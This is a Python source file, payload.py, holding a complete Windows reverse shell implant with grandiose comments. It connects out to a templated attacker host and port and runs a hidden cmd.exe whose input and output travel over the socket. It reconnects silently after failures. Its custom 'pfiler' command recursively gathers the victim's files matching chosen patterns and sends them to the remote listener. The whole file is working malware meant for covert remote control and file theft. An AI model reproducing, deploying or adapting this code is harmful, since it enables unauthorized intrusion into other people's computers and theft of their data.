# payload.py
# The Heartbeat Soul, reborn with the power of unbreakable protocol.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch
import struct

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

def send_data(sock, data):
    """Wraps data with a 4-byte length header and sends it."""
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
        # The protocol: 4-byte length header, then the data itself.
        msg = struct.pack('>I', len(data)) + data
        sock.sendall(msg)
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass # Fail silently if the connection is dead

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha256 = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                sha256.update(block)
        return sha256.hexdigest()
    except:
        return None

def find_files(start_path, patterns):
    """Recursively finds files matching a list of patterns."""
    found_files = []
    # Handle the case where the user provides a full path to a single file
    if len(patterns) == 1 and os.path.isfile(patterns[0]):
        if os.access(patterns[0], os.R_OK):
            return [patterns[0]]
        else:
            return []
            
    for root, _, files in os.walk(start_path):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                full_path = os.path.join(root, filename)
                if os.access(full_path, os.R_OK):
                    found_files.append(full_path)
    return found_files

def handle_pfiler_command(s_obj, command):
    """
    Handles the file transfer. This function now has EXCLUSIVE control over the socket
    for the duration of the transfer.
    """
    try:
        parts = command.strip().split()
        if len(parts) < 2:
            return

        patterns = parts[1:]
        
        # Determine search path. If a full path is given, use it. Otherwise, use CWD.
        first_arg = parts[1]
        if os.path.isdir(os.path.dirname(first_arg)) and '\\' in first_arg or '/' in first_arg:
            search_path = os.path.dirname(first_arg)
            patterns = [os.path.basename(first_arg)] if not '*' in os.path.basename(first_arg) else patterns
            if os.path.isfile(first_arg): # Handle single full path file
                 files_to_send = find_files(search_path, [first_arg])
            else: # Handle directory with wildcards
                 files_to_send = find_files(search_path, patterns)
        else:
            search_path = os.getcwd()
            files_to_send = find_files(search_path, patterns)
        
        # 1. Send the number of files to be transferred
        s_obj.sendall(struct.pack('>I', len(files_to_send)))
        
        for file_path in files_to_send:
            try:
                # For sending, always calculate relpath from the original search path
                if os.path.isabs(file_path):
                    relative_path = os.path.basename(file_path) # Simplified for absolute paths
                else:
                    relative_path = os.path.relpath(file_path, search_path)

                file_size = os.path.getsize(file_path)
                file_hash = calculate_sha256(file_path)

                if not file_hash:
                    raise IOError("Could not calculate hash.")

                # 2. Send file metadata: path, size, hash
                send_data(s_obj, relative_path)
                send_data(s_obj, str(file_size))
                send_data(s_obj, file_hash)

                # 3. Send file content in chunks
                with open(file_path, 'rb') as f:
                    while True:
                        chunk = f.read(16384) # 16KB chunks
                        if not chunk:
                            break
                        s_obj.sendall(chunk)
            
            except Exception:
                # Signal a skip for this file to the listener to maintain sync
                send_data(s_obj, "ERROR_SKIP_FILE")
                send_data(s_obj, "0")
                send_data(s_obj, "0")
                continue
    except Exception:
        # A broad failure. The listener will time out and recover.
        # Send a zero count to immediately terminate the listener's loop.
        s_obj.sendall(struct.pack('>I', 0))

def run_conduit():
    """Main reverse shell loop. The conduit is now purified."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(
                ["cmd.exe"],
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                creationflags=0x08000000
            )
            
            stop_event = threading.Event()

            def pipe_to_socket(stream, sock):
                while not stop_event.is_set():
                    try:
                        output = stream.read(1)
                        if output:
                            sock.sendall(output)
                        else:
                            break
                    except:
                        break
            
            stdout_thread = threading.Thread(target=pipe_to_socket, args=(p.stdout, s_obj), daemon=True)
            stderr_thread = threading.Thread(target=pipe_to_socket, args=(p.stderr, s_obj), daemon=True)
            stdout_thread.start()
            stderr_thread.start()

            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data: break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()

                    # --- THE DIVINE CORRECTION ---
                    if command_str.lower().startswith('pfiler '):
                        # The pfiler command is a sacred rite for THIS script.
                        # It is NOT passed to cmd.exe.
                        # This prevents cmd.exe from outputting anything during the transfer.
                        handle_pfiler_command(s_obj, command_str)
                    else:
                        # All other commands are passed to the mortal shell.
                        if command_str.lower().startswith('cd '):
                            try:
                                target_dir = command_str.split(' ', 1)[1].strip('"')
                                os.chdir(target_dir)
                            except:
                                pass
                        p.stdin.write(data)
                        p.stdin.flush()

                except (ConnectionResetError, BrokenPipeError, OSError):
                    break
            
            stop_event.set()
            p.terminate()
            s_obj.close()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()